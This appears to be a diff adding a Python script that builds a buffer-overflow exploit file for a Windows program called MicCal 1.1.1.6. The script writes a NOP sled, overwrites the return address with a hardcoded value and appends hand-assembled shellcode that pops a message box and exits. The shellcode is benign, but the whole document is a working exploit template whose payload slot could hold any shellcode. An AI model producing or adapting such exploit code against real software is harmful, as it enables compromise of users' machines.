@@ -1,0 +1,32 @@
+filepath = "C:\\ShellCode\\MicCal 1.1.1.6 - Exploit.bin"
+f = open(filepath, "wb")
+ 
+# dummy data
+f.write('\x90' * 340)
+ 
+# overwrite ret
+f.write('\xD7\x30\x9D\x7C')
+f.write("[BraniX]")
+f.write('A' * 8)
+ 
+# start shellcode
+f.write('\x83\xEC\x08')         # sub esp,8
+f.write('\x88\x04\x24')         # mov byte ptr [esp], al
+f.write('\x83\xEC\x08')         # sub esp,8
+ 
+f.write('\x54')                 # push esp
+f.write('\x5B')                 # pop ebx
+ 
+f.write('\x50')                 # push eax
+f.write('\x53')                 # push ebx
+f.write('\x53')                 # push ebx
+f.write('\x50')                 # push eax
+ 
+f.write('\xE8\x35\x08\x27\x7E') # call user32.MessageBoxA
+f.write('\x57')                 # push edi
+ 
+f.write('\xE8\x57\xCB\x6E\x7C') # call kernel32.ExitProcess
+ 
+f.write('\xCC' * 10)            # int 3's
+ 
+f.close()
